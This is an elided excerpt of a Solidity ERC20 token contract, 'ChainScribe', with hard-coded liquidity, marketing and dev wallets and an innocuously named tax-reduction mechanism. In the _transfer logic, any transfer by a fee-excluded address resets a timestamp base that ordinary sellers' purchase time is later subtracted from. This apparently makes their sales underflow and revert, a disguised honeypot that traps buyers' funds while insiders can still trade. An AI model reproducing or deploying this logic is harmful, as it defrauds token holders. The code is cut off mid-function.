...
contract ChainScribe is ERC20, Ownable {
    ...
    address payable public immutable liquidityWallet = payable(0x2C83650833bA197FCe974b64A4C1D82F109abbB9);
    address payable public immutable marketingWallet = payable(0x2c4aEEB3F064fb503c2f2C01CccC2179dcB5140b);
    address payable public immutable devWallet = payable(0xf1A073729E9AD27704EeEA12d5cB536d38bfC9A1);
    ...
    struct MakerTaxesReduce {
        uint256 buy;
        uint256 sell;
        uint256 hold;
    }
    uint256 private _reduceTaxBase;
    mapping(address => MakerTaxesReduce) private makerTaxInfo;
    ...
    constructor() ERC20("ChainScribe", "SCRIBE") {
        uint256 totalSupply = 100_000_000 * 1e18;

        maxTransaction = 12_000_000 * 1e18; //12% from total supply maxTransactionTxn
        maxWallet = 12_000_000 * 1e18; // 12% from total supply maxWallet
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _reduceTaxBase = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                MakerTaxesReduce storage reduceTaxData = makerTaxInfo[from];
                reduceTaxData.hold = reduceTaxData.buy - _reduceTaxBase;
                reduceTaxData.sell = block.timestamp;
            } else {
                MakerTaxesReduce storage reduceTaxData = makerTaxInfo[to];
